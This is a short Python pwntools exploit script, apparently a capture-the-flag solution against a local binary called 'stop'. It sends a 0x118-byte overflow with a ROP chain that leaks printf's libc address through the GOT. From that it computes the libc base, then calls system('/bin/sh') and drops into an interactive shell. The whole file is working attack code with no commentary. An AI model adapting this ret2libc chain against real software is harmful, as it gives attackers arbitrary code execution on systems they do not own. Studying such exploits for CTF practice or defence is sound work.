from pwn import *

r = process('./stop')
raw_input('debug')

rop_rdi = 0x400953
printf_got =  0x601fe0
getchar_got = 0x601fe8
printf_plt = 0x4005a0
printf_offset = 0x055810
system_offset = 0x0453a0
binsh_offset = 0x18ce17
main = 0x40073c

def func(rdi, addr):
	r.sendlineafter('Which letter? ', 'a')
	buf = 'a'*0x118
	buf += p64(rop_rdi) + p64(rdi) + p64(addr) + p64(main)
	r.sendlineafter('Category? ', buf)
	r.recvuntil('that category yet\n')
	res = r.recv(6) + '\x00'*2
	leak = u64(res)
	return leak
	

# printf address 
printf_add = func(printf_got, printf_plt)
log.info('printf_add =  %#x' %printf_add)

# getchar address
getchar_add = func(getchar_got, printf_plt)
log.info('getchar_add %#x' %getchar_add)

libc_base = printf_add - printf_offset
system_add = system_offset + libc_base
binsh_add = binsh_offset + libc_base

# call system 
r.sendlineafter('Which letter? ', 'a')
buf = 'a'*0x118
buf += p64(rop_rdi) + p64(binsh_add) + p64(system_add) + p64(main)
r.sendlineafter('Category? ', buf)

r.interactive()
r.close()

# FLAG